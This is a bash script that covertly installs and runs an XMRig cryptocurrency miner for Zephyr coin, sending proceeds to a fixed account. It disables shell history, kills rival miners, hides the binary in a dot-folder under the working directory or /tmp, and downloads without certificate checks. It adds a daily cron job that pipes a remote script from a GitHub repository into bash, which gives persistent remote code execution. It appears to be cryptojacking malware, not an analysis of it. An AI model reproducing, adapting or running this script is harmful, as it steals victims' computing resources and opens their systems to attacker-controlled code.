#!/bin/bash


set +o history

HOST="zeph.kryptex.network"

killall xmrig


p=$(pwd)
ROOT_path="$p/.usr"
wallet="snake9411@proton.me"
xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
random_number=$(shuf -i 10000000-99999999 -n 1)
command=""
existing_crontab=$(crontab -l 2>/dev/null)



if curl --output /dev/null --silent --head --fail "http://$HOST"; then
    echo "The network is smooth to $HOST"
else
    echo "connection failed to $HOST"
    exit 1
fi





if [ ! -d "$ROOT_path" ]; then
    echo "The folder does not exist, creating"
    mkdir -p "$ROOT_path"
    if [ $? -ne 0 ]; then
        echo "$ROOT_path Unable to create folder !!!"
        ROOT_path="/tmp/.usr"
        mkdir -p "$ROOT_path"
        if [ $? -ne 0 ]; then
            echo "$ROOT_path Unable to create folder !!!"
            exit 1
        else
            p="/tmp"
        fi
    fi
fi

cd "$ROOT_path" || handle_error "Unable to switch to directory: $ROOT_path !!!"

wget --no-check-certificate -O "xmrig.tar.gz" "$xmrig_url"
if [ -f "xmrig.tar.gz" ];then
    echo "Wget xmrig downloaded successfully"
else
    echo "Wget xmrig download failed"
    curl -L https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz -o xmrig.tar.gz
    if [ -f "xmrig.tar.gz" ];then
        echo "curl xmrig downloaded successfully"
    else
        echo "curl download failed"
   fi
fi
tar -xzf "xmrig.tar.gz" -C "$ROOT_path"
mv xmrig xmr
chmod 777 "$ROOT_path/xmr"
a='./xmr --coin zephyr --url "zeph.kryptex.network:8888" --user "'
c='/'
d='" --tls -k -B '
com="$a$wallet$c$random_number$d"

start_sh="$ROOT_path/start.sh"
if [ -f "$start_sh" ]; then
    echo "Startup file exists: $start_sh"
    wall=$(cat start.sh 2>/dev/null)
    if grep -q "$wallet" "$start_sh"; then
        echo "character string '$wallet' Exists in file '$start_sh' "
        chmod +x start.sh
        if pgrep xmr >/dev/null; then  
            echo "xmr Process exists"
            exit 1
        else  
            echo "xmrProcess not exists, starting "
            ./start.sh
        fi
        
    else
        echo "character string '$wallet' Not present in file '$start_sh' "
        echo "Generate startup file"
        if pgrep xmr > /dev/null; then
          
           pkill xmr
           echo "The xmr process has been killed"
        else
           echo "xmr Process does not exist"
        fi
        echo $com > start.sh
        chmod +x start.sh
        ./start.sh
    fi
else
    echo "The startup file does not exist: $start_sh"
    echo "Generate startup file"
    echo $com > start.sh
    chmod +x start.sh
    ./start.sh
fi



sleep 10


if pgrep xmr > /dev/null; then
    echo "xmr Process exists, exit Shell code execution"
    
else
    echo "xmr Process does not exist"
    exit 0
fi

if crontab -l | grep "curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh"; then
    echo "The specified scheduled task has been added !!!"
else
    (crontab -l 2>/dev/null; printf "0 1 * * *  cd $p;curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash\n") | crontab -
    echo "The specified scheduled task has been added"
fi

